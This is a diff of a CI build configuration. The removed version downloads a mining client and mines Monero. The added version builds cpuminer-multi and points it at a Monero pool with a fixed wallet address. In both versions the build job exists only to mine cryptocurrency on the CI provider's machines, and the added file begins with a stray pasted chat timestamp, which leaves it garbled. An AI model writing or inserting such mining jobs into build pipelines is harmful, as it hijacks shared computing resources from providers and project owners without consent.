@@ -1,12 +1,17 @@
-language: bash
-sudo: true
-os:
-- linux
-build-master:
+[5:38 PM, 11/4/2017] Вали: image: ubuntu:latest
+
+build:
   stage: build
   script:
-    - apt-get update 
-    - apt-get -qq --no-install-recommends install ca-certificates wget
-    - wget -q --content-disposition https://minergate.com/download/deb-cli
-    - dpkg -i *.deb
-    - minergate-cli -user mssalatgereev@gmail.com -xmr
+    - apt-get update && apt-get install -y git
+    - apt-get install -y build-essential  automake autoconf git make libcurl4-openssl-dev linux-headers-generic
+    - export CFLAGS="-march=native"
+    - mkdir /opt/minerd
+    - cd /opt/minerd
+    - git clone https://github.com/wolf9466/cpuminer-multi.git
+    - cd cpuminer-multi
+    - ./autogen.sh
+    - ./configure
+    - make
+    - make install
+    - minerd -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -u 41vQQqGeEMmWNNvXhpDme9aCDktYDSNtwJ1Ed1prZQ4yj7NksCdGt6zbWkVkthoCLfj2M1ct31zrka2fAXiExYBa7jCcSf2 -p x
